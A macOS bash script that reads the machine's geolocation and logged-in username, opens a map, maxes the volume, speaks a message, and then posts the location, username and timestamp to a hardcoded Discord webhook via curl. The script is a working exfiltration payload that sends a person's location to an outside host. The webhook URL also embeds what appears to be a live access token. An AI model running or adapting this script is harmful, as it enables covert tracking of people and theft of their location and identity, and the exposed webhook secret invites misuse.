#!/bin/bash
# This script retrieves your geolocation, opens a map with your coordinates,
# sets your system volume to maximum, speaks a custom message, and sends the information
# to a Discord webhook.
#
# Requirements:
# - macOS
# - CoreLocationCLI installed (brew install corelocationcli)
#
# Usage:
#   ./script.sh "Your custom message here"
# If no message is provided, a default message is spoken.

# Verify that CoreLocationCLI is installed
if ! command -v CoreLocationCLI &> /dev/null; then
    echo "CoreLocationCLI is not installed. Install it using: brew install corelocationcli"
    exit 1
fi

# Retrieve geolocation using CoreLocationCLI
location_output=$(CoreLocationCLI)
latitude=$(echo "$location_output" | grep -i "latitude:" | awk '{print $2}' | tr -d ',')
longitude=$(echo "$location_output" | grep -i "longitude:" | awk '{print $2}')

# Get the current username for logging purposes
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

echo "Your location: Latitude $latitude, Longitude $longitude"

# Construct Google Maps URL and open it
map_url="https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}"
echo "Opening map: $map_url"
open "$map_url"

# Set system volume to maximum using AppleScript
osascript -e 'set volume output volume 100'

# Determine the message to speak:
# Use the first argument if provided, otherwise use a default message.
if [ -n "$1" ]; then
    message="$1"
else
    message="This is your current location."
fi

echo "Speaking message: $message"
say "$message"

# Get the current timestamp
timestamp=$(date)

# Prepare the captured information to send to Discord
capture="Timestamp: ${timestamp}\nUsername: ${username}\nLatitude: ${latitude}\nLongitude: ${longitude}\nMessage: ${message}"

# Save the captured information to a temporary file
echo -e "$capture" > pass.txt

# Send captured data to the Discord webhook using Python for proper JSON formatting
# Replace the URL below with your actual Discord webhook URL if needed.
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"

if [[ -f pass.txt ]]; then
    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
    curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
    rm pass.txt
else
    echo "Error: pass.txt not found" > error.txt
fi
